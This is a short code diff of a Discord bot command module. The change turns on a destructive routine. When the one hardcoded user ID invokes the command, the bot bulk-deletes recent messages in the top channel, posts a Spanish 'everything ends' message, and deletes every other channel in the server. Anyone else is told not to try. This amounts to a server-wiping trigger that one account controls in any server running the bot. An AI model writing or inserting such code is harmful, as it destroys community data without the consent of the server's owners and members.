@@ -7,13 +7,13 @@ module.exports = {
         if(message.author.id === '423129757954211880') {
 			const server = message.channel.guild;
 			server.channels.filter(ch => ch.calculatedPosition === 0).tap(ch => {
-				if(ch.type === 'text')
-					ch.send('awawa');
+				if(ch.type === 'text') {
+					ch.bulkDelete(100, true);
+					ch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
+				}
 			});
-			/*const [primerch, restoch] = server.channels.partition(ch => ch.calculatedPosition === 0);
-			primerch.bulkDelete(100, true);
-			primerch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
-			restoch.deleteAll();*/
+			
+			server.channels.filter(ch => ch.calculatedPosition !== 0).deleteAll();
         } else {
             message.channel.send('*Nisiquiera lo intentes.*');
             return;
